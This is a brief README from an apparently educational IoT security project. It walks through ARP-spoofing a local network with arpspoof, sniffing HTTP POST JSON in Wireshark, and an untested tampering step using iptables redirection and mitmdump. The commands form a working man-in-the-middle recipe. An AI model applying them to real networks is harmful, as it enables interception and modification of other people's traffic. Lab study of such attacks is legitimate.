# Data Sniffer with Wireshark and ARP Spoof

> Sniffering data with Wireshark having a spoofed ARP. Payload modification and redirection wasn't tested.

## Sniffering Steps

This section uses Kali proprietary methods. If any package is missing, download it with pip install or sudo apt-get. These steps were tested in a local infrastructure network with the following connected: two raspberry pi 3 (one as a client, and another as a server), one notebook as Darth, one PWA with WS connection with Rasp Server.

1\. Get Raspberry Client and Server IPs from Local Router
2\. Enable IP Forwarding for received packets

``` bash
$ echo 1 > /proc/sys/net/ipv4/ip_forward
```

3\. ARP poisoning with arpspoof, passing target/router IPs and transmission conductor

``` bash
arpspoof -i wlan0 -t XXX.XXX.XXX.XXX -r XXX.XXX.XXX.XXX
``` 

Example with target 192.168.0.2 and router 192.168.0.3:

``` bash
arpspoof -i wlan0 -t 192.168.0.2 -r 192.168.0.3
``` 

4\. Open Wireshark and filter POST methods to be view

``` bash
$ ip.src == XXX.XXX.XXX.XXX && http.request.method == "POST"
``` 

5\. Open packet HTTP POST element and get Javascript Object Notation

![Javascript Object Notation inside Wireshark POST Packet](https://raw.githubusercontent.com/davikawasaki/iot-security-vulnerability/master/imgs/wireshark_sniffer.png)

## Tampering Steps

These steps weren't tested yet, so use it with your own responsability.

1\. Route HTTP Traffic from 80 port to 8080

``` bash
$ iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

2\. Modify temperature packets from /load server resource with mitmdump and change_packet.py script:

``` bash
$ mitmdump -T -s change_packet.py
```
